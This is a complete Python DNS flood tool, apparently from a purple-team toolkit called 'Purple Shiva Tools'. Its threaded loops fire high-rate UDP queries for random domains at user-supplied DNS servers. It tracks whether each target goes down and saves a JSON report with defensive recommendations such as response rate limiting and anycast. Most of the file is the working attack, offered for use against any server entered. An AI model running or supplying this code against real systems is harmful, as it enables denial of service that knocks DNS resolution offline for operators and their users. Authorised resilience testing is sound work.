#!/usr/bin/env python3
# DNS Flood Attack + Reporting

import argparse
import socket
import random
import struct
import threading
import time
import os
import signal
import sys
import json
import xml.etree.ElementTree as ET
from datetime import datetime

# Terminal colors
RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

RECOMMENDATIONS = [
    {
        "id": 1,
        "title": "Implement Rate Limiting on DNS Servers",
        "severity": "High",
        "description": "DNS flood attacks overwhelm servers by sending a massive number of DNS queries. Rate limiting can control the number of queries from a single IP, reducing attack effectiveness.",
        "specificDetails": {
            "recommendation": "Configure DNS server software (e.g., BIND, Unbound, PowerDNS) to limit requests per second per IP using features like Response Rate Limiting (RRL)."
        },
        "sources": [
            "ISC BIND Documentation on Response Rate Limiting (RRL)",
            "Cloudflare: How Rate Limiting Protects DNS Infrastructure"
        ]
    },
    {
        "id": 2,
        "title": "Deploy Anycast DNS Architecture",
        "severity": "Medium",
        "description": "Anycast allows DNS queries to be distributed to the nearest server in a global network, improving resilience and balancing traffic loads during an attack.",
        "specificDetails": {
            "recommendation": "Use Anycast routing with geographically distributed DNS servers to improve load distribution and resistance to DDoS attacks."
        },
        "sources": [
            "RIPE NCC Article on Anycast DNS",
            "Cloudflare: Benefits of Anycast Networks for DNS"
        ]
    },
    {
        "id": 3,
        "title": "Use DNS Firewalls and DDoS Protection Services",
        "severity": "High",
        "description": "DNS firewalls can identify and block malicious DNS traffic patterns. DDoS mitigation providers offer scalable protection against volumetric attacks.",
        "specificDetails": {
            "recommendation": "Integrate DNS firewall solutions and subscribe to DDoS protection services such as Cloudflare, Akamai, or AWS Shield."
        },
        "sources": [
            "Akamai: DNS Firewall Best Practices",
            "AWS Shield Documentation for DDoS Protection"
        ]
    },
    {
        "id": 4,
        "title": "Enable Logging and Anomaly Detection",
        "severity": "Medium",
        "description": "Monitoring DNS logs helps detect unusual spikes in query rates, which may indicate an ongoing flood attack.",
        "specificDetails": {
            "recommendation": "Use tools like ELK Stack, Splunk, or Grafana with DNS log integration to monitor traffic and trigger alerts on anomalies."
        },
        "sources": [
            "Elastic Stack Guide: Analyzing DNS Logs for Security",
            "SANS Institute: DNS Monitoring for Incident Detection"
        ]
    },
    {
        "id": 5,
        "title": "Harden DNS Server Configurations",
        "severity": "Medium",
        "description": "Securing DNS servers reduces the surface area vulnerable to attack, such as disabling recursion for external clients and limiting access.",
        "specificDetails": {
            "recommendation": "Disable open recursion, limit zone transfers, restrict access by IP, and keep DNS server software up-to-date."
        },
        "sources": [
            "Internet Society: DNS Security Best Practices",
            "BIND Admin Guide: Secure DNS Server Configuration"
        ]
    }
]


logDir = "/var/log/purpleshivatoolslog"

#if os.geteuid() != 0:
#    print(f"{RED}Error: This script must be run as root.{RESET}")
#    sys.exit(1)

# Global variables
dnsServers = []
attackDuration = 0
queryRate = 0
dnsThreads = 10
dnsRunning = False
startTime = None
packetsSent = 0
failures = []
stopTimer = False
stdoutLock = threading.Lock()
timerThread = None
dnsServerStatus = {}
dnsServerDownSince = {}


def UpdateTimer(startTime):
    global stopTimer, packetsSent
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFormatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))

        if not dnsServerStatus:
            statusStr = f"{BOLD}Waiting for DNS data...{RESET}"
        else:
            statusStr = " | ".join(
                f"{server}: {BOLD}{GREEN}UP{RESET}" if status else f"{server}: {BOLD}{RED}DOWN{RESET}"
                for server, status in dnsServerStatus.items()
            )

        with stdoutLock:
            sys.stdout.write(
                f"\r\033Packets Sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{elapsedFormatted}{RESET} | DNS Status: {statusStr}  "
            )
            sys.stdout.flush()

        time.sleep(1)

    with stdoutLock:
        sys.stdout.write("\n")
        sys.stdout.flush()


def MonitorDnsStatus(startTime):
    checkInterval = 5
    while dnsRunning:
        for server in dnsServers:
            alive = IsDnsServerResponsive(server, timeout=1)
            prevStatus = dnsServerStatus.get(server, True)
            dnsServerStatus[server] = alive

            if prevStatus and not alive:
                dnsServerDownSince[server] = time.time() - startTime
            elif alive and server in dnsServerDownSince:
                del dnsServerDownSince[server]
        time.sleep(checkInterval)

def GenerateRandomDomain():
    letters = "abcdefghijklmnopqrstuvwxyz"
    domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
    return domain + ".com"

def CreateDnsQuery(domain):
    transactionId = random.randint(0, 65535)
    flags = struct.pack(">H", 0x0100)
    numQueries = struct.pack(">H", 1)
    encodedDomain = b""
    for label in domain.split("."):
        encodedDomain += struct.pack(">B", len(label)) + label.encode()
    encodedDomain += b"\x00"
    return (
        struct.pack(">H", transactionId)
        + flags
        + numQueries
        + b"\x00\x00\x00\x00\x00\x00"
        + encodedDomain
        + struct.pack(">H", 1)
        + struct.pack(">H", 1)
    )

def SendDnsQueries():
    global dnsRunning, packetsSent, failures
    endTime = time.time() + attackDuration
    while dnsRunning and time.time() < endTime:
        try:
            targetIp = random.choice(dnsServers)
            domain = GenerateRandomDomain()
            query = CreateDnsQuery(domain)
            sockType = socket.AF_INET6 if ":" in targetIp else socket.AF_INET
            sock = socket.socket(sockType, socket.SOCK_DGRAM)
            sock.sendto(query, (targetIp, 53))
            sock.close()
            packetsSent += 1
            time.sleep(1 / queryRate)
        except Exception as e:
            failures.append(str(e))
            time.sleep(0.001)

def DnsFlood():
    threads = []
    for _ in range(dnsThreads):
        t = threading.Thread(target=SendDnsQueries)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def IsDnsServerResponsive(targetIp, timeout=2):
    transactionId = random.randint(0, 65535)
    flags = 0x0100  # standard query
    qdcount = 1
    ancount = nscount = arcount = 0

    header = struct.pack(">HHHHHH", transactionId, flags, qdcount, ancount, nscount, arcount)

    domain_parts = "google.com".split(".")
    query = b""
    for part in domain_parts:
        query += struct.pack("B", len(part)) + part.encode()
    query += b"\x00"

    qtype = 1  # Type A
    qclass = 1  # Class IN
    query += struct.pack(">HH", qtype, qclass)

    message = header + query

    try:
        # Choose socket type based on IP version
        if ":" in targetIp:  # IPv6
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        else:  # IPv4
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.settimeout(timeout)
        sock.sendto(message, (targetIp, 53))
        data, _ = sock.recvfrom(512)
        sock.close()

        resp_id = struct.unpack(">H", data[:2])[0]
        return resp_id == transactionId
    except Exception:
        return False


def MonitorDnsServers():
    while dnsRunning:
        for server in dnsServers:
            alive = IsDnsServerResponsive(server)
            status = "UP" if alive else "DOWN"
            with stdoutLock:
                print(f"\n[Monitor] DNS Server {server} status: {status}")
        time.sleep(10)  # check every 10 seconds

def Start():
    global dnsRunning, startTime, stopTimer, timerThread, packetsSent

    dnsRunning = True
    packetsSent = 0
    startTime = time.time()
    stopTimer = False

    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()

    monitorThread = threading.Thread(target=MonitorDnsStatus, args=(startTime,), daemon=True)
    monitorThread.start()

    try:
        DnsFlood()
    finally:
        dnsRunning = False
        stopTimer = True
        timerThread.join()
        formatChoice = input(
            f"\nSave report as {BOLD}[XML]{RESET}, {BOLD}[JSON]{RESET}, "
            f"{BOLD}[PDF]{RESET} or {BOLD}[ALL]{RESET} (leave blank for none): "
        ).strip().lower()

        if formatChoice in ('xml', 'json', 'pdf', 'all'):
            WriteLogs(formatChoice, dnsServers, packetsSent, attackDuration)
        else:
            print(f"{RED}No log saved.{RESET}")

def WriteJsonLog(filePath, dnsServers, packetsSent, duration):
    global dnsServerDownSince

    downtimeReport = []
    for server in dnsServers:
        downSince = dnsServerDownSince.get(server)
        downtimeReport.append({
        "server": server,
        "status": "DOWN" if not dnsServerStatus.get(server, True) else "UP",
        "downSince": round(downSince, 2) if downSince is not None else "Server never went down"
    })

    data = {
        "metadata": {
            "timestamp": datetime.now().isoformat(),
            "tool": "Purple Shiva Tools: DNS Flood Attack",
        },
        "dnsServers": dnsServers,
        "durationSeconds": round(duration, 2),
        "packetsSent": packetsSent,
        "packetsPerSecond": round(packetsSent / duration, 2) if duration > 0 else 0,
        "dnsServerStatus": downtimeReport,
        "securityRecommendations": [
            {
                "id": rec["id"],
                "title": rec["title"],
                "severity": rec["severity"],
                "description": rec["description"],
                "remediation": rec.get("specificDetails", {}),
                "references": rec["sources"]
            } for rec in RECOMMENDATIONS
        ]
    }

    with open(filePath, 'w') as f:
        json.dump(data, f, indent=4, sort_keys=True)
    print(f"\n{BOLD}JSON log written to:{RESET} {filePath}")



def SignalHandler(sig, frame):
    global dnsRunning, stopTimer
    print(f"\n{RED}Interrupt received. Stopping the attack...{RESET}")
    dnsRunning = False
    stopTimer = True
    sys.exit(0)


def WriteLogs(fmt, dnsServers, packetsSent, duration):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    if fmt == 'json':
        # path = os.path.join(logDir, f"pingsweep_{timestamp}.json")
        path = f"dnsflood_{timestamp}.json"
        WriteJsonLog(path, dnsServers, packetsSent, duration)


def terminal():
    global dnsServers, attackDuration, queryRate
    parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
    parser.add_argument("-d", "--dns", required=True, help="Comma-separated DNS server IPs.")
    parser.add_argument("-t", "--duration", type=int, default=120, help="Duration in seconds.")
    parser.add_argument("-q", "--query_rate", type=int, default=1000, help="Queries per second per thread.")
    args = parser.parse_args()
    dnsServers = args.dns.split(",")
    attackDuration = args.duration
    queryRate = args.query_rate
    Start()

def menu():
    global dnsServers, attackDuration, queryRate
    dnsServers = input(f"\n{RED}Enter DNS servers (comma-separated): {RESET}").split(",")
    attackDuration = int(input(f"{RED}Attack duration (s): {RESET}"))
    queryRate = int(input(f"{RED}Query rate (x10): {RESET}"))
    print("\n")
    Start()

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
